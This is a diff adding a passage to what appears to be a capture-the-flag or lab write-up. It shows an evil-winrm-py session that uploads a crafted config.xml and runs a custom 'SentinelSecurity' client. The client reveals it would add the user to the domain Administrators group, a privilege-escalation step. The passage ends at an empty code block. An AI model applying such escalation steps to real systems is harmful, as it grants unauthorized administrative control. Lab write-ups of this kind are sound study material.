@@ -1241,5 +1241,39 @@ https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/12512ed6
 And also with the help of AI 
 
 ```python
+evil-winrm-py PS C:\Program Files\SentinelSecurity.Client> upload config.xml C:\Users\b.trask\Desktop\
+Uploading /home/kali/hsm/sentinel/config.xml: 100%|█████████████████████████| 573/573 [00:00<00:00, 1.90kB/s]
+[+] File uploaded successfully as: C:\Users\b.trask\Desktop\config.xml
+```
+
+Ill first upload the config
+
+```python
+evil-winrm-py PS C:\Program Files\SentinelSecurity.Client> .\SentinelSecurity.Client.exe deploy --config 'C:\Users\b.trask\Desktop\config.xml'
+*****************************************************************
+     _______                                                     
+   _/       \_     ____  _____ _   _ _____ ___ _   _ _____ _     
+  / |       | \   / ___|| ____| \ | |_   _|_ _| \ | | ____| |    
+ /  |__   __|  \  \___ \|  _| |  \| | | |  | ||  \| |  _| | |    
+|__/((o| |o))\__|  ___) | |___| |\  | | |  | || |\  | |___| |___ 
+|      | |      | |____/|_____|_|_\_| |_| |___|_|_\_|_____|_____|
+|\     |_|     /| / ___|| ____/ ___| | | |  _ \|_ _|_   _\ \ / / 
+| \           / | \___ \|  _|| |   | | | | |_) || |  | |  \ V /  
+ \| /  ___  \ |/   ___) | |__| |___| |_| |  _ < | |  | |   | |   
+  \ | / _ \ | /   |____/|_____\____|\___/|_| \_\___| |_|   |_|   
+   \_________/                                                   
+*****************************************************************
+*************************Hello Dr. Trask*************************
+************Secure temporary accounts for your team.*************
+****************STATUS: Testing user templates.******************
+Secure channel opened!
+Online option is disabled, the Sentinel Action Policy will not be deployed.
+These configurations would have been applied to the Sentinel network:
+Add-ADGroupMember -Identity 'Administrators' -Members 'CN=Bertrand Trask,OU=Staff,DC=trask,DC=hsm'
+```
+
+This shows me what it will run
+
+```python
 
 ```
